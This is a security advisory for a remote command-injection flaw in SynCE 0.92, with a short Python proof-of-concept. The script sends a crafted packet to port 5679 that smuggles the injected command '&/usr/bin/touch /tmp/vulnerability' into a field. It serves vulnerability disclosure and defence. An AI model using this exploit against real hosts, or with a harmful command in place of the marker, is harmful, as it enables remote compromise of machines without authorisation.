source: http://www.securityfocus.com/bid/27178/info

SynCE is prone to a remote command-injection vulnerability because it fails to adequately sanitize user-supplied input data.

Attackers can exploit this issue to execute arbitrary commands in the context of the application, facilitating the remote compromise of affected computers.

SynCE 0.92 is vulnerable; other versions may also be affected. 

import socket, struct
import time
def AtoWChar(string):
    return ''.join([x+chr(0) for x in string])

HOST = '192.168.XXX.XXX'
PORT = 5679
c= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((HOST, PORT))
buf="\x00"*0x18
buf+='\x30\x00\x00\x00'
buf+='\x30\x00\x00\x00'
buf+='\x30\x00\x00\x00'
buf+="\x00"*12
string=AtoWChar("&/usr/bin/touch /tmp/vulnerability")
buf+=string+"\x00\x00"+"\x00"*12
c.send(struct.pack("L",63+len(string))+buf+"\x00" )
- ---------------------------

NOTE: for this proof of concept to work, a script file is needed on the
"$home$/.synce/scripts" directory. Some linux distributions ship with
scripts on this directory by default.
